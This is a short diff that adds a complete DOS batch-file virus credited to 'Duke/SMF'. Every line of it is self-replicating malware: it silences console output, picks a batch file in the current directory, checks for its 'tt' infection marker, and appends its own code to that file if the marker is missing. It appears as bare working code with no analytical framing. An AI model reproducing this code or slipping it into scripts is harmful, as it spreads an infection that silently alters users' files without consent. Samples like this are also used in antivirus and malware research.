@@ -1,0 +1,4 @@
+:: Created (c) by Duke/SMF
+@ctty nul|for %%b in (*.b*) do set tt=%%b
+find "tt"<%tt%
+if errorlevel 1 find "tt"<%0>>%tt%
